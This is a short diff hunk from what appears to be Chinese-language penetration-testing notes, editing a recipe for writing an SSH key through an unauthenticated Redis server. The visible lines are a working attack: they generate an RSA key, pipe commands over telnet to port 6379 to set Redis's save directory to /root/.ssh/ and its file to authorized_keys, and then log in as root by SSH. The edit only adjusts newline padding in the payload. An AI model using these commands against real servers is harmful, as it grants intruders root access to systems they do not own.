@@ -716,7 +716,7 @@ ssh秘钥写入
 ssh-keygen -t rsa   # 然后目录下生成2个文件 私钥:id_rsa 公钥:id_rsa.pub
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
 cat temp.txt #生成的ssh_payload
-(sleep 1;echo "info";sleep 2;echo "set x \"复制生成的ssh_payload\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir  /root/.ssh/";sleep 1;echo "config set dbfilename authorized_keys";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
+(sleep 1;echo "info";sleep 2;echo "set x \"\n\n复制生成的ssh_payload\n\n\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir  /root/.ssh/";sleep 1;echo "config set dbfilename authorized_keys";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
 ssh root@target -i id_rsa #本地连接即可
 
 ```
